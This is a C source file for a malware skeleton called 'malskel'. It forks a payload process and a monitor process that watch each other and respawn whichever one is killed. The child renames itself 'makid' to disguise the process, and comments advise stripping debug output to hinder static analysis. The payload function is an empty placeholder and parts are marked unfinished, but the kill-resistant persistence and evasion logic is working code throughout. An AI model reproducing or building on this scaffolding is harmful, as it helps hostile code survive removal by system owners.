// Author: Christian Bargraser

// Before deployment:
// - set bDebug to false

// To make static binary analysis more difficult consider:
// - removing all DEBUG print statements

// Important note:
// Let's say that process P1 has threads A and B
// Forking inside of P1->A will create a copy of P1->A
// It will not create a copy of P1->B

#include <pthread.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

// lets monitor() know how to respond to a dead process
#define MONITOR 1
#define PAYLOAD 2
#define NAP_TIME 1

#define DEBUG if( true == bDebug )
bool bDebug = true;

typedef struct payload_args {
    int argc;
    char **argv;
} payload_args;

typedef struct monitor_args {
    int iMode;         // the mode of the current process
    pid_t pid_monitor; // pid to monitor
    payload_args* ppa; // needed for when the monitor restarts the payload
} monitor_args;

void* monitor(void *arg);
void* payload(void *arg);
payload_args* get_payload_args(int argc, char *argv[], int iStart);

int main(int argc, char *argv[]) {

    // Future versions of malskel may receive arguments and iUsed may change
    // iUsed would need to be incremented as argv is parsed
    // malskel currently does not receive any arguments
    int iUsed = 0;

    pthread_t tid_payload;
    pthread_t tid_monitor;
    pid_t pid;
    payload_args* ppa = get_payload_args(argc, argv, iUsed);

    pid = fork();

    if( pid < 0 ) {
        
        DEBUG fprintf(stderr, "\nFork failed\n");
        exit(-1);
    }

    // child: execute payload and monitor the parent
    else if( 0 == pid ) {

        strcpy(argv[0], "makid");
        sleep(1);

        // execute the payload
        pthread_create(&tid_payload, (void*)NULL, payload, (void*)ppa);
        DEBUG fprintf(stderr, "    Thread (payload->payload): tid = %ld from pid = %d\n", tid_payload, getpid());

        // monitor the parent
        pid_t pid_parent = getppid();
        monitor_args ma = { PAYLOAD, pid_parent, ppa };
        pthread_create(&tid_monitor, (void*)NULL, monitor, &ma);
        DEBUG fprintf(stderr, "    Thread (payload->monitor): tid = %ld from pid = %d\n", tid_monitor, getpid());

        pthread_join(tid_payload, (void*)NULL);
        pthread_join(tid_monitor, (void*)NULL);
    }

    // parent: monitor the the child (payload)
    else {

        monitor_args ma = { MONITOR, pid, ppa };
        pthread_create(&tid_monitor, (void*)NULL, monitor, &ma);
        DEBUG fprintf(stderr, "    Thread (monitor->monitor): tid = %ld from pid = %d\n", tid_monitor, getpid());
        pthread_join(tid_monitor, (void*)NULL);

        while( -1 != wait(NULL) );

        /*
        monitor_args ma = { MONITOR, pid };
        monitor(&ma);
        */
    }
}

void* monitor(void *arg) {
    
    // ma.iMode: mode of the current process
    // ma.pid_monitor: pid of the process to monitor
    monitor_args ma = *((monitor_args*)arg);
    DEBUG fprintf(stderr, "Monitor: pid = %d -> pid = %d\n", getpid(), ma.pid_monitor);

    pthread_t tid_new_payload;

    while ( true ) {

        // free the PCB if the process is dead
        waitpid(ma.pid_monitor, NULL, WNOHANG);

        // check to see if the process is dead
        if( 0 != kill(ma.pid_monitor, 0) ) {
            
            pid_t pid = fork();

            if( pid < 0 ) {
        
                DEBUG fprintf(stderr, "\nFork failed\n");
                exit(-1);
            }

            // The process that was killed was in PAYLOAD mode
            // The current process is in MONITOR mode
            // The MONITOR's monitor was duplicated 
            // Make the corresponding adjustments to the parent and child's copies of monitor_args ma
            if( MONITOR == ma.iMode ) {
                
                DEBUG fprintf(stderr, "Monitor: payload (pid = %d) was killed\n", ma.pid_monitor);

                // The current process is in MONITOR mode
                // A new process in PAYLOAD mode needs to be created
                // A process in payload mode has 2 threads:
                // - monitor thread
                // - payload thread

                // WORKS! Dead process is detected
                // payload_args
                // fork -> payload thread AND monitor thread

                // child process (switch to PAYLOAD mode)
                if( 0 == pid ) {
                    
                    DEBUG fprintf(stderr, "- monitor(): BEFORE\n");
                    ma.iMode = PAYLOAD;         // the current process switches to PAYLOAD mode
                    ma.pid_monitor = getppid(); // monitor the parent which is in MONITOR mode

                    // idk why, but pthread_create makes it to where there is only one malskel in task manager
                    // if you take away pthread_create, you can see 2 malskels in the task manager

                    if( NULL == ma.ppa ) {
                        DEBUG fprintf(stderr, "ERROR: monitor(): ma.ppa is NULL\n");
                    }

                    pthread_create(&tid_new_payload, (void*)NULL, payload, (void*)ma.ppa);
                    pthread_detach(tid_new_payload);
                    // pthread_join(tid_new_payload, (void*)NULL);
                    DEBUG fprintf(stderr, "- monitor(): AFTER\n");
                }

                // parent process (remain in MONITOR mode))
                else {
                    
                    ma.pid_monitor = pid; // monitor the child which is in PAYLOAD mode
                }
            }

            // The process that was killed was in MONITOR mode
            // The current process is in PAYLOAD mode
            // The PAYLOAD's monitor was duplicated
            // Make the corresponding adjustments to parent and child's copies of monitor_args ma
            else if ( PAYLOAD == ma.iMode ) {

                DEBUG fprintf(stderr, "Payload: monitor (pid = %d) was killed\n", ma.pid_monitor);

                // The current process is in PAYLOAD mode
                // A new process in MONITOR mode needs to be created
                // The new process will only monitor, so there is no need for threads

                // WORKS! Dead process is detected
                // monitor_args
                // fork -> call monitor (no need for a thread)

                // child process (switch to MONITOR mode)
                if( 0 == pid ) {
                    
                    ma.iMode = MONITOR;         // the current process switches to MONITOR mode
                    ma.pid_monitor = getppid(); // monitor the parent which is in PAYLOAD mode
                }

                // parent process
                else {

                    ma.pid_monitor = pid; // monitor the child which is in MONITOR mode
                }
            }

            // unexpected behavior
            else {
                DEBUG fprintf(stderr, "Unexpected behavior\n");
                exit(-1);
            }
        }

        // adjust sleep time as needed
        sleep(NAP_TIME);
    }

    DEBUG fprintf(stderr, "EXITED payload(): pid = %d\n", getpid());
    return NULL;
}

void* payload(void *arg) {

    // REMOVE ME LATER
    // REMOVE ME LATER
    // REMOVE ME LATER
    if( NULL == arg ) {
        DEBUG fprintf(stderr, "ERROR: payload(): arg is NULL\n");
    }

    // process arg
    payload_args pa = *((payload_args*)arg);

    int argc = pa.argc;
    char** argv = pa.argv;

    // -- remove later --
    // WORKS! Arguments are received
    // fprintf(stderr, "Payload: argc = %d\n", argc);
    // fprintf(stderr, "Payload: argv[0] = %s\n", argv[0]);

    DEBUG fprintf(stderr, "Payload: pid = %d\n", getpid());

    return NULL;
}

// iStart specifies which index from argv to start from
// iUsed arearguments that were passed to malskel
// the following arguments are intended for the payload
payload_args* get_payload_args(int argc, char *argv[], int iUsed) {

    payload_args *ppa = (payload_args*)malloc(sizeof(payload_args));

    if( NULL == ppa ) {
        DEBUG fprintf(stderr, "Error: Malloc for ppa failed\n");
        exit(-1);
    }

    // iPayloadArgs = argc - ( <1 for argv[0]> + <malskel args> )
    int iPayloadArgs = argc - ( 1 + iUsed );

    // if there are no payload arguments
    if( 0 == iPayloadArgs ) {
        ppa->argc = 0;
        ppa->argv = NULL;
        return ppa;
    }

    // TODO: Keep on working from here

    // char** that will point to payload arguments in argv
    fprintf(stderr, "argc: %d\n", argc);
    char** p_argv = (char**)malloc( iPayloadArgs * sizeof(char*) );

    if( NULL == p_argv ) {
        DEBUG fprintf(stderr, "Error: Malloc for p_argv failed\n");
        exit(-1);
    }

    // make the char** point to the arguments in argv

    // argv[0] + iUsed = starting index of payload args
    int iOffset = 1 + iUsed;
    int i;
    for( i = 0 ; i < iPayloadArgs ; i++ ) {
        p_argv[i] = argv[i+iOffset];
        DEBUG fprintf(stderr, "p_argv[%d] = %s\n", i, p_argv[i]);
    }

    ppa->argc = iPayloadArgs;
    ppa->argv = p_argv;
    
    return ppa;
}

/*
monitor_args* new_monitor_args(int iMode, int pid_monitor, payload_args* ppa) {

    monitor_args* = (monitor_args*)malloc(sizeof(monitor))
}
*/